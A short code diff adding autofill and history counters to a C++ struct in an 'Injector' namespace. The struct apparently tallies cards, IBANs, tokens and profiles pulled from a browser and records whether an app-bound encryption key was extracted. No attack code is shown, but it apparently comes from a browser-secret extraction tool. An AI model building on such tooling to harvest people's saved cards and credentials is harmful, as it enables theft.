@@ -17,6 +17,8 @@ namespace Injector {
         int cards = 0;
         int ibans = 0;
         int tokens = 0;
+        int autofill = 0;   // NEW: Autofill entries count
+        int history = 0;    // NEW: History entries count
         int profiles = 0;
         bool noAbe = false;          // DEPRECATED: Kept for backward compatibility
         bool hasAppKey = false;      // NEW: True if app-bound key was extracted
